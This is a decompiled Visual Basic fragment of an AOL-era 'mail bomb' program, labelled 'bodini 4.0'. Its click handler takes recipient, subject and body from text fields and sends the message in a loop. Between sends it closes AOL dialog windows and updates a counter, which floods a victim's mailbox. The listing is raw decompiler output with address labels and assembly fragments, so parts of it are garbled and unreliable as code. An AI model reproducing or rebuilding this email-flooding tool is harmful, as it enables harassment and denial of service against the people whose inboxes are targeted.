Private Sub Command1_Click() '5C15A0
  loc_005C1666: 
  loc_005C16B6: var_eax = call Proc_3_4_5A51B0(var_88, var_28, 3)
  loc_005C16C4: var_38 = var_88
  loc_005C16ED: var_eax = call Proc_6098C0(1, var_28, "•bodini 4.0• mail bomb •spek•")
  loc_005C1713: var_3C = Text1.Text
  loc_005C1758: var_44 = Text3.Text
  loc_005C179D: var_4C = Text4.Text
  loc_005C17D5: var_50 = vbNullString & var_4C
  loc_005C17E9: var_80 = var_50 & vbNullString
  loc_005C1827: var_100 = vbNullString
  loc_005C182D: var_120 = vbNullString
  loc_005C1845: var_110 = "<p align center>"
  loc_005C1905: var_eax = call Proc_79_15_603B90(vbNullString & var_3C & vbNullString, vbNullString & var_44 & vbNullString, var_50 & vbNullString & Chr(13) & Chr(10) & vbNullString & "<p align center>" & var_38 & vbNullString)
  loc_005C199C: var_ret_1 = "_AOL_Modal"
  loc_005C19A3: var_eax = FindWindow(var_ret_1, 0)
  loc_005C19E4: var_eax = SendMessage(FindWindow(var_ret_1, 0), 16, 0, 0)
  loc_005C1A24: var_3C = Text2.Text
  loc_005C1A6A: call __vbaStrR8
  loc_005C1A75: var_40 = __vbaStrR8
  loc_005C1A81: Text2.Text = var_40
  loc_005C1ADF: var_3C = Text2.Text
  loc_005C1B07: fcomp real8 ptr [00402230h]
  loc_005C1B19: GoTo loc_005C1B1D
  loc_005C1B1D: 'Referenced from: 005C1B19
  loc_005C1B34: If ebx = 0 Then GoTo loc_005C1666
  loc_005C1B42: GoTo loc_005C1B40
  loc_005C1B4A: GoTo loc_005C1BD7
  loc_005C1BD6: Exit Sub
  loc_005C1BD7: 'Referenced from: 005C1B4A
  loc_005C1BE7: Exit Sub
End Sub